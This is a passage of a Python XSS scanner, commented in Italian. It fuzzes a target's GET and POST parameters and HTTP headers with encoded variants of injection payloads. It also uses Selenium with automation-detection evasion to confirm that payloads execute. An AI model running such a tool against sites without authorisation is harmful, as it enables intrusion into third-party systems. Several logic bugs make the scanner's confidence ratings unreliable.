            logging.info(f"{Fore.RED}[-] Error loading payloads: {e}")
            return False
        return True

    def diversify_payloads(self, payloads):
        """Diversifica i payload per aumentare le possibilità di successo"""
        diversified = set()
        
        for payload in payloads:
            diversified.add(payload)
            diversified.add(payload.upper())
            diversified.add(payload.lower())
            diversified.add(quote(payload))
            diversified.add(payload.replace('<', '%3C').replace('>', '%3E'))
        
        return list(diversified)[:500]

    def setup_selenium(self):
        """Configura Selenium per i test reali"""
        if "SELENIUM" not in self.scan_methods and "DOM" not in self.scan_methods:
            return True
            
        try:
            if self.browser_type == "chrome":
                chrome_options = Options()
                if self.headless:
                    chrome_options.add_argument("--headless=new")
                chrome_options.add_argument("--no-sandbox")
                chrome_options.add_argument("--disable-dev-shm-usage")
                chrome_options.add_argument("--disable-gpu")
                chrome_options.add_argument("--window-size=1920,1080")
                chrome_options.add_argument("--disable-blink-features=AutomationControlled")
                chrome_options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
                chrome_options.add_experimental_option('useAutomationExtension', False)
                
                if self.user_agent:
                    chrome_options.add_argument(f"--user-agent={self.user_agent}")
                
                if self.proxy:
                    chrome_options.add_argument(f"--proxy-server={self.proxy}")
                
                self.driver = webdriver.Chrome(options=chrome_options)
                
            else:  # Firefox
                firefox_options = FirefoxOptions()
                if self.headless:
                    firefox_options.add_argument("--headless")
                
                if self.user_agent:
                    firefox_options.set_preference("general.useragent.override", self.user_agent)
                
                if self.proxy:
                    proxy_parts = self.proxy.replace('http://', '').split(':')
                    firefox_options.set_preference("network.proxy.type", 1)
                    firefox_options.set_preference("network.proxy.http", proxy_parts[0])
                    firefox_options.set_preference("network.proxy.http_port", int(proxy_parts[1]))
                    firefox_options.set_preference("network.proxy.ssl", proxy_parts[0])
                    firefox_options.set_preference("network.proxy.ssl_port", int(proxy_parts[1]))
                
                self.driver = webdriver.Firefox(options=firefox_options)
            
            self.driver.set_page_load_timeout(self.timeout)
            logging.info(f"{Fore.GREEN}[+] Selenium configured with {self.browser_type}")
            return True
            
        except Exception as e:
            logging.info(f"{Fore.RED}[-] Selenium error: {e}")
            logging.info(f"{Fore.YELLOW}[!] Install Chrome/Firefox drivers")
            self.driver = None
            return False

    def run_scan(self):
        """Esegue la scansione completa"""
        if not self.target_url or not self.payloads:
            logging.info(f"{Fore.RED}[-] Target URL and payloads are required")
            return
        
        # Configura session
        if self.proxy:
            self.session.proxies = {'http': self.proxy, 'https': self.proxy}
        
        for name, value in self.cookies.items():
            self.session.cookies.set(name, value)
        
        if self.user_agent:
            self.session.headers['User-Agent'] = self.user_agent
        
        logging.info(f"\n{Fore.CYAN}[*] Starting Ultimate XSS Scan")
        logging.info(f"{Fore.CYAN}[*] Target: {self.target_url}")
        logging.info(f"{Fore.CYAN}[*] Methods: {', '.join(self.scan_methods)}")
        logging.info(f"{Fore.CYAN}[*] Threads: {self.threads}")
        logging.info(f"{Fore.CYAN}[*] Timeout: {self.timeout}s")
        
        start_time = time.time()
        
        # Esegui la scansione in base ai metodi selezionati
        if "GET" in self.scan_methods:
            self.scan_get_method()
        
        if "POST" in self.scan_methods:
            self.scan_post_method()
        
        if "HEADERS" in self.scan_methods:
            self.scan_headers_method()
        
        if "SELENIUM" in self.scan_methods and self.driver:
            self.scan_selenium_method()
        
        if "DOM" in self.scan_methods and self.driver:
            self.scan_dom_method()
        
        end_time = time.time()
        self.generate_final_report(start_time, end_time)
        
        if self.driver:
            self.driver.quit()

    def scan_get_method(self):
        """Scansione metodo GET"""
        logging.info(f"\n{Fore.YELLOW}[*] Scanning GET parameters...")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for payload in self.payloads[:100]:
                for param in self.fuzz_params[:5]:
                    futures.append(executor.submit(self.test_get_param, payload, param))
            
            self.process_futures(futures, "GET")

    def test_get_param(self, payload, param):
        """Testa un parametro GET"""
        try:
            test_url = f"{self.target_url}?{param}={quote(payload)}"
            response = self.session.get(test_url, timeout=self.timeout)
            
            if self.check_reflection(response.text, payload):
                return {
                    'type': 'GET',
                    'payload': payload,
                    'url': test_url,
                    'param': param,
                    'confidence': 'HIGH' if self.is_executable(response.text, payload) else 'MEDIUM',
                    'method': 'GET'
                }
        except:
            pass
        return None

    def scan_post_method(self):
        """Scansione metodo POST"""
        logging.info(f"\n{Fore.YELLOW}[*] Scanning POST parameters...")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for payload in self.payloads[:50]:
                futures.append(executor.submit(self.test_post_param, payload))
            
            self.process_futures(futures, "POST")

    def test_post_param(self, payload):
        """Testa parametri POST"""
        try:
            data = {param: payload for param in self.fuzz_params[:3]}
            response = self.session.post(self.target_url, data=data, timeout=self.timeout)
            
            if self.check_reflection(response.text, payload):
                return {
                    'type': 'POST',
                    'payload': payload,
                    'url': self.target_url,
                    'data': data,
                    'confidence': 'HIGH' if self.is_executable(response.text, payload) else 'MEDIUM',
                    'method': 'POST'
                }
        except:
            pass
        return None

    def scan_headers_method(self):
        """Scansione headers"""
        logging.info(f"\n{Fore.YELLOW}[*] Scanning HTTP headers...")
        
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
        
        for header in headers_to_test:
            for payload in self.payloads[:30]:
                result = self.test_header(header, payload)
                if result:
                    self.results.append(result)
                    self.print_vulnerability(result)

    def test_header(self, header, payload):
        """Testa un header HTTP"""
        try:
            original_value = self.session.headers.get(header)
            self.session.headers[header] = payload
            
            response = self.session.get(self.target_url, timeout=self.timeout)
            
            if self.check_reflection(response.text, payload):
                return {
                    'type': f'HEADER-{header}',
                    'payload': payload,
                    'url': self.target_url,
                    'confidence': 'MEDIUM',
                    'method': 'HEADER'
                }
            
            if original_value:
                self.session.headers[header] = original_value
            else:
                del self.session.headers[header]
                
        except:
            pass
        return None

    def scan_selenium_method(self):
        """Scansione con Selenium"""
        logging.info(f"\n{Fore.YELLOW}[*] Verifying with Selenium...")
        
        for i, payload in enumerate(self.payloads[:20]):
            result = self.test_selenium(payload)
            if result:
                self.results.append(result)
                self.print_vulnerability(result)
            
            progress = ((i + 1) / min(20, len(self.payloads))) * 100
            logging.info(f"{Fore.CYAN}[*] Selenium progress: {progress:.1f}%", end='\r')

    def test_selenium(self, payload):
        """Test XSS con Selenium"""
        if not self.driver:
            return None
            
        try:
            test_url = f"{self.target_url}?q={quote(payload)}"
            
            self.driver.execute_script("""
                window.xssDetected = false;
                window.xssAlertMessage = null;
                window.originalAlert = window.alert;
                window.alert = function(msg) {
                    window.xssDetected = true;
                    window.xssAlertMessage = msg;
                    return true;
                };
            """)
            
            self.driver.get(test_url)
            time.sleep(2)
            
            xss_detected = self.driver.execute_script("return window.xssDetected || false;")
            alert_message = self.driver.execute_script("return window.xssAlertMessage;")
            
            if xss_detected:
                return {
                    'type': 'SELENIUM',
                    'payload': payload,
                    'url': test_url,
                    'alert_message': alert_message,
                    'confidence': 'CRITICAL',
                    'verified': True,
                    'method': 'SELENIUM'
                }
                
        except:
            pass
        return None

    def scan_dom_method(self):
        """Scansione DOM XSS"""
        logging.info(f"\n{Fore.YELLOW}[*] Scanning DOM XSS...")
        
        for payload in self.payloads[:15]:
            result = self.test_dom_xss(payload)
            if result:
                self.results.append(result)
                self.print_vulnerability(result)

    def test_dom_xss(self, payload):
        """Test DOM XSS"""
        if not self.driver:
            return None
            
        try:
            test_url = f"{self.target_url}#{quote(payload)}"
            self.driver.get(test_url)
            time.sleep(2)
            
            dom_indicators = self.driver.execute_script("""
                var scripts = document.getElementsByTagName('script');
                for (var i = 0; i < scripts.length; i++) {
                    if (scripts[i].innerHTML.includes('location.hash') || 
                        scripts[i].innerHTML.includes('document.URL') ||
                        scripts[i].innerHTML.includes('window.location')) {
                        return true;
                    }
                }
                return false;
            """)
            
            if dom_indicators:
                return {
                    'type': 'DOM_XSS',
                    'payload': payload,
                    'url': test_url,
                    'confidence': 'MEDIUM',
                    'method': 'DOM'
                }
                
        except:
            pass
        return None

    def process_futures(self, futures, method_name):
        """Processa i futures del ThreadPoolExecutor"""
        completed = 0
        total = len(futures)
        
        for future in as_completed(futures):
            try:
                result = future.result()
                if result and result not in self.results:
                    self.results.append(result)
                    self.print_vulnerability(result)
            except:
                pass
            
            completed += 1
            progress = (completed / total) * 100
            logging.info(f"{Fore.CYAN}[*] {method_name} progress: {progress:.1f}% ({completed}/{total})", end='\r')

    def check_reflection(self, html, payload):
        """Controlla reflection del payload"""
        if payload in html:
            return True
        
        encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
        if encoded in html:
            return True
            
        return False

    def is_executable(self, html, payload):
        """Verifica se il payload potrebbe essere eseguito"""
        indicators = ['<script>', 'alert(', 'onerror=', 'onload=', 'javascript:']
        return any(indicator in html.lower() for indicator in indicators)

    def print_vulnerability(self, result):
        """Stampa una vulnerabilità trovata"""
        colors = {
            'CRITICAL': Fore.RED,
            'HIGH': Fore.MAGENTA,
            'MEDIUM': Fore.YELLOW,
            'LOW': Fore.BLUE
        }
        
        colors = {
            'CRITICAL': Fore.RED,
            'HIGH': Fore.MAGENTA,
            'MEDIUM': Fore.YELLOW,
            'LOW': Fore.BLUE
        }
        color = colors.get(result['confidence'], Fore.WHITE)
        
        logging.info(f"\n{color}[!] {result['type']} - Confidence: {result['confidence']}")
        logging.info(f"{color}    Payload: {result['payload'][:80]}...")
        logging.info(f"{color}    URL: {result.get('url', 'N/A')}")
        
        if 'alert_message' in result:
            logging.info(f"{color}    Alert: {result['alert_message']}")
        if 'param' in result:
            logging.info(f"{color}    Parameter: {result['param']}")

    def generate_final_report(self, start_time, end_time):
        """Genera il report finale"""
        logging.info(f"\n{Fore.CYAN}" + "="*70)
        logging.info(f"{Fore.CYAN} XSS ULTIMATE SCAN COMPLETED")
        logging.info(f"{Fore.CYAN}" + "="*70)
        
        duration = end_time - start_time
        logging.info(f"{Fore.GREEN}[+] Scan duration: {duration:.2f} seconds")
        logging.info(f"{Fore.GREEN}[+] Payloads used: {len(self.payloads)}")
        logging.info(f"{Fore.GREEN}[+] Vulnerabilities found: {len(self.results)}")
        
        # Statistiche
        critical = len([r for r in self.results if r['confidence'] == 'CRITICAL'])
        high = len([r for r in self.results if r['confidence'] == 'HIGH'])
        medium = len([r for r in self.results if r['confidence'] == 'MEDIUM'])
        
        logging.info(f"{Fore.RED}[!] CRITICAL (executed): {critical}")
        logging.info(f"{Fore.MAGENTA}[!] HIGH (likely): {high}")
        logging.info(f"{Fore.YELLOW}[!] MEDIUM (reflected): {medium}")
        
        if self.results:
            logging.info(f"\n{Fore.RED}[!] VULNERABILITIES FOUND:")
            # Definiamo i colori per la confidence
            colors = {
                'CRITICAL': Fore.RED,
                'HIGH': Fore.MAGENTA,
                'MEDIUM': Fore.YELLOW,
                'LOW': Fore.BLUE
            }
            for i, result in enumerate(self.results, 1):
                color = colors.get(result['confidence'], Fore.WHITE)
                verified = "✅" if result.get('verified') else "⚠️"
                logging.info(f"{color} {i}. {verified} {result['type']} - {result['payload'][:50]}...")
            
            # Salva report
            self.save_report(duration)
        else:
            logging.info(f"{Fore.GREEN}[+] No vulnerabilities found")

    def save_report(self, duration):
        """Salva il report su file"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"xss_ultimate_report_{timestamp}.json"
        
        report = {
            'scan_info': {
                'target': self.target_url,
                'timestamp': timestamp,
                'duration_seconds': round(duration, 2),
                'payloads_count': len(self.payloads),
                'vulnerabilities_count': len(self.results)
            },
            'vulnerabilities': self.results,
            'scan_config': {
                'threads': self.threads,
                'timeout': self.timeout,
                'depth': self.depth,
                'methods': self.scan_methods,
                'user_agent': self.user_agent
            }
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        logging.info(f"{Fore.GREEN}[+] Detailed report saved: {filename}")

    def display_results(self, results):
        """Visualizza risultati in formato leggibile"""
        logging.info(f"\n{Fore.CYAN}=== SCAN RESULTS ===")
        
        for i, result in enumerate(results, 1):
            color = {
                'CRITICAL': Fore.RED,
                'HIGH': Fore.MAGENTA,
                'MEDIUM': Fore.YELLOW
            }.get(result.get('confidence', 'MEDIUM'), Fore.WHITE)
            
            logging.info(f"\n{color}{i}. {result.get('type', 'Unknown')} - {result.get('confidence', 'MEDIUM')}")
            logging.info(f"   Payload: {result.get('payload', 'N/A')}")
            logging.info(f"   URL: {result.get('url', 'N/A')}")
            if result.get('alert_message'):
                logging.info(f"   Alert: {result['alert_message']}")

    def display_advanced_results(self, data):
        """Visualizza risultati avanzati"""
        scan_info = data.get('scan_info', {})
        vulnerabilities = data.get('vulnerabilities', [])
        
        logging.info(f"\n{Fore.CYAN}=== SCAN REPORT ===")
        logging.info(f"{Fore.WHITE}Target: {scan_info.get('target', 'N/A')}")
        logging.info(f"{Fore.WHITE}Date: {scan_info.get('timestamp', 'N/A')}")
        logging.info(f"{Fore.WHITE}Duration: {scan_info.get('duration_seconds', 0)}s")
        logging.info(f"{Fore.WHITE}Vulnerabilities: {scan_info.get('vulnerabilities_count', 0)}")
        
        self.display_results(vulnerabilities)

def main():
    """Funzione principale"""
    try:
        scanner = XSSScannerUltimate()
        scanner.print_banner()
        scanner.interactive_menu()
    except KeyboardInterrupt:
        logging.info(f"\n{Fore.YELLOW}[!] Tool interrupted by user")
    except Exception as e:
        logging.info(f"{Fore.RED}[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    main()